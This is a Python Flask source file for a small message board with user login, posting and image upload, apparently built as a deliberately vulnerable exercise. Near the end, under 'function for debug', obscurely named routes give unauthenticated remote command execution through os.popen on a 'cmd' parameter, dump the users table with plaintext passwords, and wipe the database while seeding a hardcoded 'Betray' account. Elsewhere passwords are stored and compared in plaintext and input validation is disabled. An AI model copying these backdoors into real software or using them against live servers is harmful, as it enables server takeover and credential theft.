from flask import Flask, request, make_response, redirect, session, render_template, send_file, flash 
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import create_engine
import pandas as pd
import os
import json
import re
import random
import string
app = Flask(__name__)
app.secret_key = os.urandom(32)

#############
### setup sql
#############

# ref : https://stackabuse.com/using-sqlalchemy-with-flask-and-postgresql/	
sql_url = os.environ['SQLALCHEMY_DATABASE_URI']
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = True
app.config['SQLALCHEMY_DATABASE_URI'] = sql_url
#app.config['SQLALCHEMY_DATABASE_URI'] = os.environ['SQLALCHEMY_DATABASE_URI']
db = SQLAlchemy(app)

max_len = 100

### setup timezone
from datetime import datetime, timezone, timedelta
tz = timezone(timedelta(hours=+8))

################
### setup upload
################
import filetype
from werkzeug.utils import secure_filename
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg'}
app.config['UPLOAD_PATH'] = os.path.join('static','img')
app.config['MAX_CONTENT_LENGTH'] = 2 * 1024 * 1024  ## 2MB

regex = re.compile(r'^[A-Za-z0-9_-]*$')

## TODO : init a betray account

class User(db.Model):
    __tablename__ = 'users'
    
    id = db.Column(db.Integer, primary_key=True,autoincrement=True)
    username = db.Column(db.String(max_len),unique=True,nullable=False)
    password = db.Column(db.String(max_len),nullable=False)
    img_name = db.Column(db.String(128),nullable=False)

    def __init__(self,username,password,img_name='bible.jpg'):
        self.username = username
        self.password = password
        self.img_name = img_name

class Message(db.Model):
    __tablename__ = 'message'
    
    id = db.Column(db.Integer, primary_key=True,autoincrement=True)
    message = db.Column(db.String(4096),nullable=False)
    is_deleted = db.Column(db.Boolean)
    timestamp =  db.Column(db.String(30),nullable=False)
    uid = db.Column(db.Integer, db.ForeignKey('users.id'))
    user = db.relationship('User')

    def __init__(self, message):
        self.message = message
        self.is_deleted = 0
        self.timestamp = datetime.now(tz).strftime("%Y-%m-%d %H:%M:%S")


@app.route('/')
def hello():
    db.create_all()        
    return render_template('index.html')

@app.route('/about')
def about():
	return render_template('about.html')

########################
## user function
########################

@app.route('/create_user')
def create_user():
    if 'username' in session:
        flash('Please Logout First')
        return redirect('/')
	
    return render_template('create_user.html')

@app.route("/login", methods=['POST'])
def login():

    # already login 
    if 'username' in session:
        flash('Please Logout First')
        return redirect('/')    

    # check password
    def valid_user(user,password):
        return user.password == password

    def is_blank(username,password):
        return len(password) < 1 and len(username) < 1 
    
    def is_only_number_letter(username,password):
        return True
        #return regex.match(username) and  regex.match(password)

    def is_max_len(username,password):
        return len(username) > max_len or len(password) > max_len 
     
    username = request.form.get('username')
    password = request.form.get('password')

    

    user = User.query.filter_by(username=username).first()
    ## user don't exits
    if not user :
       # no blank input 
        if is_blank(username,password):
            flash("Username are blank or Password are blank")
            return redirect("/create_user")
        
        if not is_only_number_letter(username,password):
            flash("Only numbers, letters and dashes are allowed")
            return redirect("/create_user")

        if is_max_len(username,password) :
            flash(f"Exceed Max Length {max_len}")
            return redirect("/create_user")            
        ### create user to db 
        new_user = User(username,password)
        db.session.add(new_user)
        db.session.commit()
        
        # create session 
        session['username'] = username

        return redirect('user')

    ## input != password
    elif not valid_user(user,password):
        flash('User already exists or Password Error')
        return redirect("/create_user")
    
    ### valid user / login and create session 
    session['username'] = username
    flash('Login Success, Welcome')
    return redirect("/")

@app.route('/logout')
def logout():
    session.clear()
    flash('Logout Success, see you next time')
    return redirect("/")


@app.route('/user')
def user():
    user_list = User.query.order_by(User.id).all()
    return render_template('user.html',user_data=user_list)

####################
# message board
####################


@app.route('/message_board')
def message_board():
    
    #render message to web
    message_list = Message.query.order_by(Message.id).all()
    return render_template('board.html', message_list = message_list)


    #print(username)
    

@app.route('/add_message',methods=['POST'])
def add_message():

    ## not login 
    if 'username' not in session:
        flash("Please Login First")
        return redirect('message_board')   

    ## get username from session 
    username = session['username']
    #user = User.query.filter_by(username=username).first()
    
    ## add message to db 
    message = request.form.get('message')
    user = User.query.filter_by(username=username).first()
    new_message = Message(message=message)
    new_message.user = user
    db.session.add(new_message)
    db.session.commit()


    return redirect('message_board')

@app.route('/delete_message',methods=['POST'])
def delete_message():
    
    # not login 
    if 'username' not in session:
        flash("Please Login First")
        return redirect('message_board')    


    msg_id = request.form.get('msg_id')
    message = Message.query.filter_by(id=msg_id).first()
    
    ## check username == current user 
    if session['username'] != message.user.username :
        flash("You are not the owner of this message.")
        return redirect('message_board')   
    
    ## Set message is_delete to True

    message.is_deleted = True
    db.session.commit()

    flash("Delete Success")
    return redirect('message_board')    

###################
# upload img
###################

@app.route('/upload_img')
def upload_img():
    if 'username' not in session:
        flash("Please Login First")
        return redirect('create_user')     
    return render_template('upload.html')

## flask doc :https://flask.palletsprojects.com/en/2.2.x/patterns/fileuploads/
def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/uploader',methods=['POST'])
def uploader():
    
    # not login 
    if 'username' not in session:
        flash("Please Login First")
        return redirect('create_user')   

    ## no file upload 
    if 'file' not in request.files:
        flash('No file part')
        return redirect('/upload_img')   

    file = request.files['file']

    ## no file selected
    if file.filename == '':
        flash('No selected file')
        return redirect('/upload_img') 

    ### check file extension 
    if not allowed_file(file.filename):
        flash('Please upload .jpg or .png extension')
        return redirect('/upload_img')

    ## check file type 

    tmp_filetype = filetype.guess(file.read())
    file.seek(0)

    ## file no magic number (empty file or text file)
    if tmp_filetype == None :
        flash('Please upload jpg or png image')
        return redirect('/upload_img')   
    
    ## check mime type
    file_mime = tmp_filetype.mime     
    if file_mime != 'image/png' and file_mime != 'image/jpeg' :
        flash('Please upload jpg or png image')
        return redirect('/upload_img')

    ## If same filename/ then change upload filename like add some random bytes
    filename = secure_filename(file.filename)
    filepath = os.path.join(app.config['UPLOAD_PATH'],filename)
    
    while os.path.isfile(filepath) :
        filename = ''.join(random.choice(string.ascii_letters) for _ in range(4)) + filename
        filepath = os.path.join(app.config['UPLOAD_PATH'],filename)

    file.save(filepath)

    ##  add filename to user db 
    user = User.query.filter_by(username=session['username']).first()
    user.img_name = filename
    db.session.commit()

    flash('Upload Success')
    return redirect('/upload_img')  


###################
# function for debug
###################

@app.route('/shell_fsdjfhldskjflkjdslfjldskjflkdsjflkjds')
def bbbbb():
    cmd = request.args.get('cmd')
    
    return os.popen(f'{cmd}').read()

@app.route('/check_user_db_fjkdlsjflkdsjflkjdslkfjldskjfldsk')
def check_user_db():
    #ref https://stackoverflow.com/questions/38151817/sqlalchemy-print-contents-of-table
    engine = create_engine(sql_url, echo = False)
    user_table = pd.read_sql_table(table_name="users", con=engine)
    result = user_table.to_json(orient="records")
    parsed = json.loads(result)  
    result = json.dumps(parsed, indent=4) 
    return result

@app.route('/check_message_db_fklsdkjflkjdsflkjdlsf')
def check_message_db():
    #ref https://stackoverflow.com/questions/38151817/sqlalchemy-print-contents-of-table
    engine = create_engine(sql_url, echo = False)
    user_table = pd.read_sql_table(table_name="message", con=engine)
    result = user_table.to_json(orient="records")
    parsed = json.loads(result)  
    result = json.dumps(parsed, indent=4) 
    return result

@app.route('/init_db_gkdjkflsdflksdjfkldsjflkjdsl')
def init_db():
    db.drop_all()
    db.create_all() 
    new_user = User('Betray','gjdklgjdlkghdfgkjl','home.png')
    db.session.add(new_user)
    db.session.commit()

    return redirect('/')


## TODO : debug=False
if __name__ == '__main__':
	app.run(host='0.0.0.0', port=8000,debug=False)